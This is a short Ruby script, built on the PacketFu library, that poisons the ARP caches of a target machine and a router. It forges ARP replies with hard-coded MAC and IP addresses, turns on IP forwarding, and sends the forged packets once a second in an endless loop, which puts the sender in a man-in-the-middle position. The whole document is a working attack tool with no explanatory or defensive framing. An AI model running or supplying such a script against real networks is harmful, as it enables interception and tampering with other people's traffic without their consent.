#!/usr/bin/env ruby
require 'rubygems'
require 'packetfu'

# Simple program to send a gratuitous ARP to a target machine.
# The ARP cache on the target machine is poisoned continuously.

# Construct the target's packet
arp_packet_target = PacketFu::ARPPacket.new()
arp_packet_target.eth_saddr = '78:2b:cb:a3:6b:62'       # sender's MAC address
arp_packet_target.eth_daddr = '78:2b:cb:a3:ef:c9'       # target's MAC address
arp_packet_target.arp_saddr_mac = '78:2b:cb:a3:6b:62'   # sender's MAC address
arp_packet_target.arp_daddr_mac = '78:2b:cb:a3:ef:c9'   # target's MAC address
arp_packet_target.arp_saddr_ip = '192.168.0.100'        # router's IP
arp_packet_target.arp_daddr_ip = '192.168.0.13'         # target's IP
arp_packet_target.arp_opcode = 2                        # arp code 2 == ARP reply
 
# Construct the router's packet
arp_packet_router = PacketFu::ARPPacket.new()
arp_packet_router.eth_saddr = '78:2b:cb:a3:6b:62'       # sender's MAC address
arp_packet_router.eth_daddr = '00:1a:6d:38:15:ff'       # router's MAC address
arp_packet_router.arp_saddr_mac = '78:2b:cb:a3:6b:62'   # sender's MAC address
arp_packet_router.arp_daddr_mac = '00:1a:6d:38:15:ff'   # router's MAC address
arp_packet_router.arp_saddr_ip = '192.168.0.13'         # target's IP
arp_packet_router.arp_daddr_ip = '192.168.0.100'        # router's IP
arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply

# Enable IP forwarding
`echo 1 > /proc/sys/net/ipv4/ip_forward`

# Send out both packets
caught=false
while caught==false do
  sleep 1
  arp_packet_target.to_w(@interface)
  arp_packet_router.to_w(@interface)
end
